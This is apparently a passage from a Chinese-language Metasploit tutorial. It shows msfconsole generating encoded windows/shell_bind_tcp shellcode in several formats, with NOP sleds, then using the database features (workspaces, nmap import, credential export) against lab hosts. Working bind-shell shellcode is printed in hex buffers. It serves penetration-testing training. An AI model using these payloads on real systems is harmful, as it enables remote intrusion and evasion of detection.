"\xf9\x15\x99\x69\x57\x18\x7b\x09\x1c\xbc\xe6\xb9\xc5\xde" + 
"\xc1\x81\xe7\xb8\xdc\x3a\x51\xaa\x34\xc0\x82\x7d\x6e\x45" + 
"\xeb\x2b\x27\x08\x79\xfe\x8d\xe3\x2a\xed\x14\xe7\x46\x45" + 
...snip... 
对比上面的两种编码情况，我们会发现： 
1. 2 次编码得到的 payload 较 1 次大。 
2. 1 次编码与 2 次编码，部分 code 相同(查阅黄色部分) 
也就是说，第二次编码只是对第一次黄色代码下面的部分进行处理。 
下面来看一下 5 次编码后的结果. 
msf  payload(shell_bind_tcp) > generate -b '\x00' -i 5 
# windows/shell_bind_tcp - 476 bytes 
# http://www.metasploit.com 
# Encoder: x86/shikata_ga_nai 
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,  
# InitialAutoRunScript=, AutoRunScript= 
buf =  
"\xb8\xea\x18\x9b\x0b\xda\xc4\xd9\x74\x24\xf4\x5b\x33\xc9" + 
"\xb1\x71\x31\x43\x13\x83\xeb\xfc\x03\x43\xe5\xfa\x6e\xd2" + 
"\x31\x23\xe4\xc1\x35\x8f\x36\xc3\x0f\x94\x11\x23\x54\x64" + 
"\x0b\xf2\xf9\x9f\x4f\x1f\x01\x9c\x1c\xf5\xbf\x7e\xe8\xc5" + 
"\x94\xd1\xbf\xbb\x96\x64\xef\xc1\x10\x9e\x38\x45\x1b\x65" + 
...snip... 
代码较之前大，也与之前的 shellcode 没有相似之处。 
如果想要自行指定 payload 参数，可先使用’show options’查看 payload 的参数. 
msf  payload(shell_bind_tcp) > show options 
Module options (payload/windows/shell_bind_tcp): 
   Name      Current Setting  Required  Description 
   ----      ---------------  --------  ----------- 
   EXITFUNC  process          yes       Exit technique: seh, thread, process, 
none 
   LPORT     4444             yes       The listen port 
   RHOST                      no        The target address 
然后使用’-o’改变参数值， 
msf  payload(shell_bind_tcp) > generate -o LPORT=1234,EXITFUNC=seh -b 
'\x00' -e x86/shikata_ga_nai 
# windows/shell_bind_tcp - 368 bytes 
# http://www.metasploit.com 
# Encoder: x86/shikata_ga_nai 
# VERBOSE=false, LPORT=1234, RHOST=, EXITFUNC=seh,  
# InitialAutoRunScript=, AutoRunScript= 
buf =  
"\xdb\xd1\xd9\x74\x24\xf4\xbb\x93\x49\x9d\x3b\x5a\x29\xc9" + 
"\xb1\x56\x83\xc2\x04\x31\x5a\x14\x03\x5a\x87\xab\x68\xc7" + 
"\x4f\xa2\x93\x38\x8f\xd5\x1a\xdd\xbe\xc7\x79\x95\x92\xd7" + 
"\x0a\xfb\x1e\x93\x5f\xe8\x95\xd1\x77\x1f\x1e\x5f\xae\x2e" + 
"\x9f\x51\x6e\xfc\x63\xf3\x12\xff\xb7\xd3\x2b\x30\xca\x12" + 
"\x6b\x2d\x24\x46\x24\x39\x96\x77\x41\x7f\x2a\x79\x85\x0b" + 
"\x12\x01\xa0\xcc\xe6\xbb\xab\x1c\x56\xb7\xe4\x84\xdd\x9f" + 
...snip... 
Metasploit 默认生成的是’ruby’格式的 payload，虽然 ruby 很强大，很流行，但并不是人
人都用它来开发代码。我们可以使用’-t’参数，按照自己的需求生成对应的 shellcode。 
msf  payload(shell_bind_tcp) > generate 
# windows/shell_bind_tcp - 341 bytes 
# http://www.metasploit.com 
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,  
# InitialAutoRunScript=, AutoRunScript= 
buf =  
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" + 
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" + 
"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" + 
...snip... 
msf  payload(shell_bind_tcp) > generate -t c 
/* 
 * windows/shell_bind_tcp - 341 bytes 
 * http://www.metasploit.com 
 * VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,  
 * InitialAutoRunScript=, AutoRunScript= 
 */ 
unsigned char buf[] =  
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30" 
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff" 
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2" 
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85" 
...snip... 
msf  payload(shell_bind_tcp) > generate -t java 
/* 
 * windows/shell_bind_tcp - 341 bytes 
 * http://www.metasploit.com 
 * VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,  
 * InitialAutoRunScript=, AutoRunScript= 
 */ 
byte shell[] = new byte[] 
{ 
(byte) 0xfc, (byte) 0xe8, (byte) 0x89, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x60, (byte) 0x89, 
(byte) 0xe5, (byte) 0x31, (byte) 0xd2, (byte) 0x64, (byte) 0x8b, (byte) 0x52, (byte) 0x30, (byte) 0x8b, 
(byte) 0x52, (byte) 0x0c, (byte) 0x8b, (byte) 0x52, (byte) 0x14, (byte) 0x8b, (byte) 0x72, (byte) 0x28, 
(byte) 0x0f, (byte) 0xb7, (byte) 0x4a, (byte) 0x26, (byte) 0x31, (byte) 0xff, (byte) 0x31, (byte) 0xc0, 
(byte) 0xac, (byte) 0x3c, (byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c, (byte) 0x20, (byte) 0xc1, 
...snip... 
如果需要添加 NOP(不执行 或 接下来执行)sled，可以使用参数’-s’加上 NOPs 数。这样在我
们的 payload 起始位置就会添加指定长度的 NOPs sled。请记住 sled 越大，payload 也就越
大。 
msf  payload(shell_bind_tcp) > generate 
# windows/shell_bind_tcp - 341 bytes 
# http://www.metasploit.com 
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,  
# InitialAutoRunScript=, AutoRunScript= 
buf =  
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" + 
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" + 
"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" + 
...snip... 
msf  payload(shell_bind_tcp) > generate -s 14 
# windows/shell_bind_tcp - 355 bytes 
# http://www.metasploit.com 
# NOP gen: x86/opty2 
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,  
# InitialAutoRunScript=, AutoRunScript= 
buf =  
"\xb9\xd5\x15\x9f\x90\x04\xf8\x96\x24\x34\x1c\x98\x14\x4a" + 
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" + 
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" + 
"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" + 
...snip... 
Databases 
在完成一次渗透测试的时候，记录目标网络的所有是一项很有挑战性的任务。Metasploit 
Postgresql 数据库的出现就是为了节约时间。 
这样，我们有能力快速访问扫描信息，导入导出第三方工具的结果。更重要的是，这让我们的结果
结构清晰。 
msf  payload(shell_bind_tcp) > help Database 
Database Backend Commands 
========================= 
    Command           Description 
    -------           ----------- 
    creds             List all credentials in the database 
    db_connect        Connect to an existing database 
    db_disconnect     Disconnect from the current database instance 
    db_export         Export a file containing the contents of the database 
    db_import         Import a scan result file (filetype will be auto-detected) 
    db_nmap           Executes nmap and records the output automatically 
    db_rebuild_cache  Rebuilds the database-stored module cache 
    db_status         Show the current database status 
    hosts             List all hosts in the database 
    loot              List all loot in the database 
    notes             List all notes in the database 
    services          List all services in the database 
    vulns             List all vulnerabilities in the database 
    workspace         Switch between database workspaces 
msf > hosts 
Hosts 
===== 
address          mac  name     os_name            os_flavor  os_sp  purpose  info  comments 
-------          ---  ----     -------            ---------  -----  -------  ----  -------- 
192.168.100.140       NIX-III  Microsoft Windows  7          SP1    client          
msf > services -p 21 
Services 
======== 
host            port  proto  name  state  info 
----            ----  -----  ----  -----  ---- 
172.16.194.172  21    tcp    ftp   open   vsftpd 2.3.4 
Using the Database 
Contents 
1 Workspaces 
2 Importing & Scanning 
3 Backing Up 
4 Hosts 
5 Setting up Modules 
6 Services 
7 CSV Export 
8 Creds 
9 Loot 
在 Backtrack 5 中，Metasploit 自带 PostgreSQL，监听端口是 7337，所需无须其他配
置。我们可以在’msfconsole’中使用’db_status’来确认 Metasploit 已经成功连接数据库. 
注: 数据库配置文件位于/opt/metasploit/apps/pro/ui/config/database.yml 
development: 
  adapter: "postgresql" 
  database: "msf3" 
  username: "msf3" 
  password: "4bfedfd3" 
  port: 7337 
  host: "localhost" 
  pool: 256 
  timeout: 5 
production: 
  adapter: "postgresql" 
  database: "msf3" 
  username: "msf3" 
  password: "4bfedfd3" 
  port: 7337 
  host: "localhost" 
  pool: 256 
  timeout: 5 
msf > db_status 
[*] postgresql connected to msf3 
一旦连接到数据库，我们就可以使用’workspace’组织一次不同的动作。使用 workspace 我们
可以保存不同区域/网络/子网的不同结果。使用 workspace 会显示出当前工作区列
表，’default’是连接到数据库时默认使用的工作区，名称前有 *显示。 
msf > workspace 
* default 
  msfu 
  lab1 
  lab2 
  lab3 
  lab4 
msf >  
如果想要改变当前工作区域，可以使用’workspace name’，例如: 
msf > workspace msfu 
[*] Workspace: msfu 
msf > workspace 
  default 
* msfu 
  lab1 
  lab2 
  lab3 
  lab4 
msf >  
创建和删除工作区域，分别使用’-a’和’-d’， 
msf > workspace -a lab4 
[*] Added workspace: lab4 
msf >  
msf > workspace -d lab4  
[*] Deleted workspace: lab4 
msf > workspace 
如果想要了解更多关于 workspace 的用法，请使用’-h’ 
msf > workspace -h 
Usage: 
    workspace                  List workspaces 
    workspace [name]           Switch workspace 
    workspace -a [name] ...    Add workspace(s) 
    workspace -d [name] ...    Delete workspace(s) 
    workspace -r     Rename workspace 
    workspace -h               Show this help information 
msf >  
Importing & Scanning  
使用’db_import’可以导入我们需要的文件(以某些格式 XML 为主)。 
如果想要导入一次 nmap 的扫描结果，可以使用下面方法. 
msf >  db_import /root/msfu/nmapScan  
[*] Importing 'Nmap XML' data 
[*] Import: Parsing with 'Rex::Parser::NmapXMLStreamParser' 
[*] Importing host 172.16.194.172 
[*] Successfully imported /root/msfu/nmapScan 
msf > hosts 
Hosts 
===== 
address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments 
-------         ---                ----  -------  ---------  -----  -------  ----  -------- 
172.16.194.172  00:0C:29:D1:62:80        Linux    Ubuntu            server          
msf >  
导入完成以后，我们可以使用’hosts’命令来查看这次的导入，当前工作区域的主机都会显示出
来。我们可以直接使用’db_nmap’进行扫描，扫描的结果会保存在当前数据库中。这个命令等效
于命令行下的’nmap’。 
msf > db_nmap -V 
[*] Nmap: Nmap version 5.61TEST4 ( http://nmap.org ) 
[*] Nmap: Platform: i686-pc-linux-gnu 
[*] Nmap: Compiled with: nmap-liblua-5.1.3 openssl-0.9.8x libpcre-8.30 
libpcap-1.2.1 nmap-libdnet-1.12 ipv6 
建议使用新版的 nmap，然后导入结果。 
Backing Up  
将 Metasploit 数据导出，我们可以使用’db_export’，以 XML 文件格式保存。这种格式的文
件使用起来很便利，也可用于后期产生报告。这个命令有两种输出格式，’XML’格式可以导出工作
区域所有的信息，’pwdump’格式用于导出证书相关的信息。 
msf >  db_export -h 
Usage: 
    db_export -f  [-a] [filename] 
    Format can be one of: xml, pwdump 
[-] No output file was specified 
msf > db_export -f xml /root/msfu/Exported.xml 
[*] Starting export of workspace msfu to /root/msfu/Exported.xml 
[ xml ]... 
[*]     >> Starting export of report 
[*]     >> Starting export of hosts 
[*]     >> Starting export of events 
[*]     >> Starting export of services 
[*]     >> Starting export of credentials 
[*]     >> Starting export of web sites 
[*]     >> Starting export of web pages 
[*]     >> Starting export of web forms 
[*]     >> Starting export of web vulns 
[*]     >> Finished export of report 
[*] Finished export of workspace msfu to /root/msfu/Exported.xml 
[ xml ]... 
Hosts  
msf > hosts -h 
Usage: hosts [ options ] [addr1 addr2 ...] 
OPTIONS: 
  -a,--add          Add the hosts instead of searching 
  -d,--delete       Delete the hosts instead of searching 
  -c     Only show the given columns (see list below) 
  -h,--help         Show this help information 
  -u,--up           Only show hosts which are up 
  -o          Send output to a file in csv format 
  -R,--rhosts       Set RHOSTS from the results of the search 
  -S,--search       Search string to filter by 
Available columns: address, arch, comm, comments, created_at, info, mac, 
name, note_count, os_flavor, 
 os_lang, os_name, os_sp, purpose, scope, service_count, state, 
updated_at, virtual_host, vuln_count 
使用’-c’查看指定列对应的信息， 
msf > hosts -c address,os_flavor 